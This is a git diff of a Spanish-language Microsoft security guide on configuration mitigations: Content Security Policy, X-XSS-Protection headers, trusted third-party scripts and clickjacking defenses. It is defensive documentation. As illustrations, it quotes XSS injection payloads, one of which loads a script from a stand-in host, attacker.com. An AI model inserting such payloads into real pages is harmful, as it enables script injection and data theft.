@@ -16,12 +16,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: 3c89fae09583c96cf8139885fe2554cf6784b4e3
-ms.sourcegitcommit: 2ec4b3d0bad7dc0071400c2a2264399e4fe34897
+ms.openlocfilehash: 499e4cb2cb62ccc170637bad60898b38b4ff3be7
+ms.sourcegitcommit: 67bddb15f90fb7e845ca739d16ad568cbc368c06
 ms.translationtype: HT
 ms.contentlocale: es-ES
-ms.lasthandoff: 03/28/2020
-ms.locfileid: "78269822"
+ms.lasthandoff: 04/28/2020
+ms.locfileid: "82204260"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Marco de seguridad: Administración de configuración | Mitigaciones 
 | Producto o servicio | Artículo |
@@ -45,7 +45,7 @@ ms.locfileid: "78269822"
 | **Tecnologías aplicables** | Genérico |
 | **Atributos**              | N/D  |
 | **Referencias**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) (Introducción a la directiva de seguridad del contenido), [Content Security Policy Reference](https://content-security-policy.com/) (Referencia a la directiva de seguridad del contenido), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) (Características de seguridad), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) (Introducción a la directiva de seguridad del contenido), [Can I use CSP?](https://caniuse.com/#feat=contentsecuritypolicy) (¿Puedo usar la directiva de seguridad de contenido [CSP]?) |
-| **Pasos** | <p>La directiva de seguridad de contenido (CSP) es un mecanismo de seguridad de defensa en profundidad, una norma de W3C, que permite controlar el contenido insertado en el sitio a los propietarios de aplicaciones web. La CSP se agrega como encabezado de respuesta HTTP al servidor web y se aplica en los exploradores del lado del cliente. Es una directiva basada en una lista blanca: un sitio web puede declarar un conjunto de dominios de confianza desde los que se puede cargar contenido activo, como JavaScript.</p><p>La CSP ofrece las siguientes ventajas de seguridad:</p><ul><li>**Protección frente a XSS:** si una página es vulnerable a XSS, los atacantes pueden aprovecharlo de dos maneras:<ul><li>Insertando `<script>malicious code</script>`. Gracias a la restricción básica 1 de la CSP, esta vulnerabilidad de seguridad no funcionará</li><li>Insertando `<script src="http://attacker.com/maliciousCode.js"/>`. Esta vulnerabilidad de seguridad no funcionará, ya que el dominio que controla el atacante no estará en la lista de dominios aprobados de la CSP</li></ul></li><li>**Control de la exfiltración de datos:** si cualquier contenido malintencionado de una página web intenta conectarse a un sitio web externo y robar datos, la CSP anulará la conexión. ya que el dominio de destino no estará en la lista aprobada de la CSP</li><li>**Defensa contra el secuestro de clic:** el secuestro de clic es una técnica de ataque con la que un adversario puede enmarcar un sitio web auténtico y forzar a los usuarios a hacer clic en elementos de la interfaz de usuario. La defensa actual contra el secuestro de clic se consigue mediante la configuración de un encabezado de respuesta X-Frame-Option. No todos los exploradores respetan este encabezado y la implementación de la CSP será un método estándar de defensa contra el secuestro de clic</li><li>**Informes de ataques en tiempo real:** si se produce un ataque de inserción de código en un sitio web con la CSP habilitada, los exploradores desencadenarán automáticamente una notificación a un punto de conexión configurado en el servidor web. De esta manera, la CSP actúa como sistema de advertencia en tiempo real.</li></ul> |
+| **Pasos** | <p>La directiva de seguridad de contenido (CSP) es un mecanismo de seguridad de defensa en profundidad, una norma de W3C, que permite controlar el contenido insertado en el sitio a los propietarios de aplicaciones web. La CSP se agrega como encabezado de respuesta HTTP al servidor web y se aplica en los exploradores del lado del cliente. Es una directiva basada en una lista blanca: un sitio web puede declarar un conjunto de dominios de confianza desde los que se puede cargar contenido activo, como JavaScript.</p><p>La CSP ofrece las siguientes ventajas de seguridad:</p><ul><li>**Protección frente a XSS:** si una página es vulnerable a XSS, los atacantes pueden aprovecharlo de dos maneras:<ul><li>Insertando `<script>malicious code</script>`. Esta vulnerabilidad de seguridad no funcionará debido a la restricción básica 1 de CSP.</li><li>Insertando `<script src="http://attacker.com/maliciousCode.js"/>`. Esta vulnerabilidad de seguridad no funcionará, ya que el dominio que controla el atacante no estará en la lista blanca de dominios de CSP.</li></ul></li><li>**Control de la exfiltración de datos:** si cualquier contenido malintencionado de una página web intenta conectarse a un sitio web externo y robar datos, la CSP anulará la conexión. Esto se debe a que el dominio de destino no estará en la lista blanca de CSP.</li><li>**Defensa contra el secuestro de clic:** el secuestro de clic es una técnica de ataque con la que un adversario puede enmarcar un sitio web auténtico y forzar a los usuarios a hacer clic en elementos de la interfaz de usuario. La defensa actual contra el secuestro de clic se consigue mediante la configuración de un encabezado de respuesta X-Frame-Option. No todos los exploradores respetan este encabezado y la implementación de la CSP será un método estándar de defensa contra el secuestro de clic</li><li>**Informes de ataques en tiempo real:** si se produce un ataque de inserción de código en un sitio web con la CSP habilitada, los exploradores desencadenarán automáticamente una notificación a un punto de conexión configurado en el servidor web. De esta manera, la CSP actúa como sistema de advertencia en tiempo real.</li></ul> |
 
 ### <a name="example"></a>Ejemplo
 Ejemplo de directiva: 
@@ -76,7 +76,7 @@ Example: var str="alert(1)"; eval(str);
 | **Fase de SDL**               | Build |  
 | **Tecnologías aplicables** | Genérico |
 | **Atributos**              | N/D  |
-| **Referencias**              | [Filtro de protección de XSS](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
+| **Referencias**              | [Filtro de protección de XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
 | **Pasos** | <p>La configuración del encabezado de respuesta X-XSS-Protection controla el filtro de script entre sitios del explorador. Este encabezado de respuesta puede tener los siguientes valores:</p><ul><li>`0:` Esto deshabilitará el filtro</li><li>`1: Filter enabled` Si se detecta un ataque de scripting entre sitios (XSS), para detenerlo, el explorador saneará la página</li><li>`1: mode=block : Filter enabled`. En lugar de sanearla, cuando se detecta un ataque XSS, el explorador impedirá la representación de la página</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. El explorador saneará la página y notificará la infracción.</li></ul><p>Se trata de una función de cromo que usa los informes de infracción de la CSP para enviar detalles al URI que elija. Las 2 últimas opciones se consideran valores seguros.</p>|
 
 ## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>Deshabilitación obligatoria del seguimiento y la depuración de las aplicaciones ASP.NET antes de la implementación
@@ -99,7 +99,7 @@ Example: var str="alert(1)"; eval(str);
 | **Tecnologías aplicables** | Genérico |
 | **Atributos**              | N/D  |
 | **Referencias**              | N/D  |
-| **Pasos** | debe hacerse referencia a archivos JavaScript de terceros únicamente desde orígenes de confianza. Los puntos de conexión de referencia deben estar siempre en SSL. |
+| **Pasos** | debe hacerse referencia a archivos JavaScript de terceros únicamente desde orígenes de confianza. Los puntos de conexión de referencia deben estar siempre en TLS. |
 
 ## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Comprobación de que las páginas con autenticación con ASP.NET incorporan defensas contra el secuestro de clic
 
@@ -109,7 +109,7 @@ Example: var str="alert(1)"; eval(str);
 | **Fase de SDL**               | Build |  
 | **Tecnologías aplicables** | Genérico |
 | **Atributos**              | N/D  |
-| **Referencias**              | [OWASP click-jacking Defense Cheat Sheet](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet) (Hoja de referencia rápida de OWASP sobre la defensa ante el secuestro de clic), [IE Internals - Combating click-jacking With X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) (Elementos internos de Internet Explorer: combatir el secuestro de clic con X-Frame-Options) |
+| **Referencias**              | [OWASP click-jacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html) (Hoja de referencia rápida de OWASP sobre la defensa ante el secuestro de clic), [IE Internals - Combating click-jacking With X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) (Elementos internos de Internet Explorer: combatir el secuestro de clic con X-Frame-Options) |
 | **Pasos** | <p>el secuestro de clic, también conocido como "clickjacking" o "ataque UI redress", se produce cuando un atacante utiliza varias capas transparentes u opacas para engañar al usuario para que haga clic en un botón o vínculo de otra página al intentar hacer clic en la página del nivel superior.</p><p>Estas capas se logran al elaborar una página malintencionada con un iframe, que carga la página de la víctima. Por lo tanto, el atacante "secuestra" el clic destinado a su página y los enruta a otra página, muy probablemente propiedad de otra aplicación, dominio o ambos. Para evitar el secuestro de clic, establezca los encabezados de respuesta HTTP X-Frame-Options adecuados que indiquen al explorador que no permita enmarcar a otros dominios</p>|
 
 ### <a name="example"></a>Ejemplo
